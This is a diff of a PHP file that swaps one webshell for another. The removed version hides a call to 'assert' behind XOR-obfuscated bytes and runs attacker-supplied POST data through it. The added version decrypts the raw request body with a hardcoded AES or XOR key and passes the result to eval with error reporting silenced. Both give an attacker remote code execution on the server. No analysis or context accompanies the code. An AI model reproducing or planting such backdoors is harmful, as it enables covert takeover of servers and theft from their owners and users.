@@ -1,20 +1,28 @@
-<?php 
-class JWXT { 
-    function fPzM() {
-        $Gnar = "\x90" ^ "\xf1";
-        $csSx = "\xb9" ^ "\xca";
-        $SfQJ = "\x68" ^ "\x1b";
-        $jZNR = "\x9c" ^ "\xf9";
-        $UZVc = "\x27" ^ "\x55";
-        $VOBT = "\xe0" ^ "\x94";
-        $pype =$Gnar.$csSx.$SfQJ.$jZNR.$UZVc.$VOBT;
-        return $pype;
-    }
-    function __destruct(){
-        $DTOk=$this->fPzM();
-        @$DTOk($this->BE);
-    }
-}
-$jwxt = new JWXT();
-@$jwxt->BE = isset($_GET['id'])?base64_decode($_POST['bj']):$_POST['bj'];
+<?php
+@error_reporting(0);
+session_start();
+    $key="39b9df3a0fb3356d"; 
+	//39b9df3a0fb3356d
+	//e45e329feb5d925b
+	$_SESSION['k']=$key;
+	session_write_close();
+	$post=file_get_contents("php://input");
+	if(!extension_loaded('openssl'))
+	{
+		$t="base64_"."decode";
+		$post=$t($post."");
+		
+		for($i=0;$i<strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, "AES128", $key);
+	}
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p."");}}
+    @call_user_func(new C(),$params);
 ?>
